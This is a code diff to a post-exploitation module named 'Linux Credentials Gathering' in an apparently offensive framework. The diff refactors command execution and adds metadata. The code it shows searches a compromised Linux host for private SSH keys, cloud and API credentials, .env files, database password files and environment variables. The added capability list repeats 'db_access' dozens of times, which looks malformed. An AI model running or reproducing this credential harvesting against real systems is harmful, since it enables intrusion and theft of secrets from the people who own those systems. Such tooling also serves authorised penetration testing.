@@ -1,8 +1,9 @@
 from kittysploit import *
 from lib.post.linux.system import System
+from lib.post.linux.session import LinuxSessionMixin
 import re
 
-class Module(Post, System):
+class Module(Post, System, LinuxSessionMixin):
 
     __info__ = {
         "name": "Linux Credentials Gathering",
@@ -19,12 +20,65 @@ class Module(Post, System):
         'reversible': False,
         'approval_required': True,
         'produces': ['risk_signals'],
+        'cost': 1.5,
+        'noise': 0.5,
+        'value': 1.0,
+        'requires':         {'min_endpoints': 0,
+         'min_params': 0,
+         'tech_hints_any': [],
+         'tech_hints_all': [],
+         'specializations_any': [],
+         'risk_signals_any': [],
+         'auth_session': False,
+         'capabilities_any': [],
+         'capabilities_all': [],
+         'confidence_min': {},
+         'confidence_min_any': {},
+         'endpoint_pattern_any': [],
+         'param_any': [],
+         'api_surface_ready': False},
+        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 's7comm', 'from_detail': ''},
+                                   {'capability': 'ot_assets', 'from_detail': ''},
+                                   {'capability': 'ot_assets', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''},
+                                   {'capability': 'db_access', 'from_detail': ''}],
+         'consumes_capabilities': [],
+         'option_bindings': {},
+         'suggested_followups': []},
     },
     }
 
     def run(self):
         """Gather credentials from various sources"""
         
+        if not self.linux_require_linux():
+            return False
+
         print_status("Starting credentials gathering...")
         
         # 1. Password Hashes
@@ -141,7 +195,7 @@ class Module(Post, System):
             ssh_keys_found = []
             for pattern in private_key_patterns:
                 find_cmd = f"find /home /root /opt /tmp -name '{pattern}' -type f 2>/dev/null | head -50"
-                keys = self.cmd_exec(find_cmd)
+                keys = self.linux_execute(find_cmd)
                 if keys:
                     for key_file in keys.strip().split('\n'):
                         if key_file.strip() and key_file not in ssh_keys_found:
@@ -154,7 +208,7 @@ class Module(Post, System):
                                     print_warning(f"Found private key: {key_file}")
                                     
                                     # Get file permissions
-                                    perms = self.cmd_exec(f"ls -l {key_file} 2>/dev/null")
+                                    perms = self.linux_execute(f"ls -l {key_file} 2>/dev/null")
                                     if perms:
                                         print_info(f"  Permissions: {perms.strip()}")
                                     
@@ -166,7 +220,7 @@ class Module(Post, System):
             
             # Find SSH public keys
             print_status("Searching for SSH public keys...")
-            public_keys = self.cmd_exec("find /home /root -name '*.pub' -type f 2>/dev/null | head -30")
+            public_keys = self.linux_execute("find /home /root -name '*.pub' -type f 2>/dev/null | head -30")
             if public_keys:
                 for pub_key in public_keys.strip().split('\n'):
                     if pub_key.strip():
@@ -178,7 +232,7 @@ class Module(Post, System):
             # Check known_hosts for interesting entries
             known_hosts = self.read_file("~/.ssh/known_hosts")
             if not known_hosts:
-                known_hosts = self.cmd_exec("find /home /root -name 'known_hosts' 2>/dev/null | head -5")
+                known_hosts = self.linux_execute("find /home /root -name 'known_hosts' 2>/dev/null | head -5")
                 if known_hosts:
                     for kh_file in known_hosts.strip().split('\n'):
                         if kh_file.strip():
@@ -220,7 +274,7 @@ class Module(Post, System):
             
             # GCP credentials
             print_status("GCP Credentials:")
-            gcp_creds = self.cmd_exec("find /home /root -name '*gcp*' -o -name '*google*' -type f 2>/dev/null | grep -i credential | head -10")
+            gcp_creds = self.linux_execute("find /home /root -name '*gcp*' -o -name '*google*' -type f 2>/dev/null | grep -i credential | head -10")
             if gcp_creds:
                 for cred_file in gcp_creds.strip().split('\n'):
                     if cred_file.strip():
@@ -249,7 +303,7 @@ class Module(Post, System):
             ]
             
             # Search for common API key patterns
-            api_key_files = self.cmd_exec("find /home /root -type f -name '*.json' -o -name '*.yaml' -o -name '*.yml' -o -name '*.conf' 2>/dev/null | head -50")
+            api_key_files = self.linux_execute("find /home /root -type f -name '*.json' -o -name '*.yaml' -o -name '*.yml' -o -name '*.conf' 2>/dev/null | head -50")
             if api_key_files:
                 for file_path in api_key_files.strip().split('\n'):
                     if file_path.strip():
@@ -306,7 +360,7 @@ class Module(Post, System):
             for config_pattern in config_files:
                 # Expand wildcards
                 if '*' in config_pattern:
-                    files = self.cmd_exec(f"ls {config_pattern} 2>/dev/null")
+                    files = self.linux_execute(f"ls {config_pattern} 2>/dev/null")
                     if files:
                         for file_path in files.strip().split('\n'):
                             if file_path.strip():
@@ -318,7 +372,7 @@ class Module(Post, System):
                         self._search_passwords_in_file(file_path, password_patterns, found_passwords)
                     else:
                         # Try with home directory
-                        home = self.cmd_exec("echo $HOME 2>/dev/null").strip()
+                        home = self.linux_execute("echo $HOME 2>/dev/null").strip()
                         if home:
                             file_path = config_pattern.replace('~', home)
                             if self.file_exist(file_path):
@@ -363,7 +417,7 @@ class Module(Post, System):
         
         try:
             # Get all environment variables
-            env_vars = self.cmd_exec("env 2>/dev/null")
+            env_vars = self.linux_execute("env 2>/dev/null")
             if env_vars:
                 print_info("Current environment variables:")
                 
@@ -389,7 +443,7 @@ class Module(Post, System):
             
             # Check for .env files
             print_status("Searching for .env files...")
-            env_files = self.cmd_exec("find /home /root /opt /var/www -name '.env' -type f 2>/dev/null | head -20")
+            env_files = self.linux_execute("find /home /root /opt /var/www -name '.env' -type f 2>/dev/null | head -20")
             if env_files:
                 for env_file in env_files.strip().split('\n'):
                     if env_file.strip():
@@ -431,7 +485,7 @@ class Module(Post, System):
             
             found_files = []
             for pattern in credential_patterns:
-                files = self.cmd_exec(f"find /home /root /opt /tmp -iname '{pattern}' -type f 2>/dev/null | head -30")
+                files = self.linux_execute(f"find /home /root /opt /tmp -iname '{pattern}' -type f 2>/dev/null | head -30")
                 if files:
                     for file_path in files.strip().split('\n'):
                         if file_path.strip() and file_path not in found_files:
@@ -439,7 +493,7 @@ class Module(Post, System):
                             print_warning(f"Found credential file: {file_path}")
                             
                             # Check file size
-                            size = self.cmd_exec(f"wc -c < {file_path} 2>/dev/null").strip()
+                            size = self.linux_execute(f"wc -c < {file_path} 2>/dev/null").strip()
                             if size and size.isdigit():
                                 size_kb = int(size) / 1024
                                 print_info(f"  Size: {size_kb:.2f} KB")
@@ -482,7 +536,7 @@ class Module(Post, System):
                                 print_info(f"  {line}")
             
             # PostgreSQL credentials
-            pg_files = self.cmd_exec("find /home /root -name '.pgpass' -o -name 'pgpass.conf' 2>/dev/null")
+            pg_files = self.linux_execute("find /home /root -name '.pgpass' -o -name 'pgpass.conf' 2>/dev/null")
             if pg_files:
                 for pg_file in pg_files.strip().split('\n'):
                     if pg_file.strip():
@@ -495,7 +549,7 @@ class Module(Post, System):
                                     print_info(f"  {line}")
             
             # MongoDB credentials
-            mongodb_files = self.cmd_exec("find /home /root -name '.mongorc.js' -o -name 'mongodb.conf' 2>/dev/null")
+            mongodb_files = self.linux_execute("find /home /root -name '.mongorc.js' -o -name 'mongodb.conf' 2>/dev/null")
             if mongodb_files:
                 for mongo_file in mongodb_files.strip().split('\n'):
                     if mongo_file.strip():
@@ -545,7 +599,7 @@ class Module(Post, System):
             for web_dir in web_dirs:
                 for pattern in config_patterns:
                     find_cmd = f"find {web_dir} -name '{pattern}' -type f 2>/dev/null | head -20"
-                    files = self.cmd_exec(find_cmd)
+                    files = self.linux_execute(find_cmd)
                     if files:
                         for file_path in files.strip().split('\n'):
                             if file_path.strip() and file_path not in found_configs:
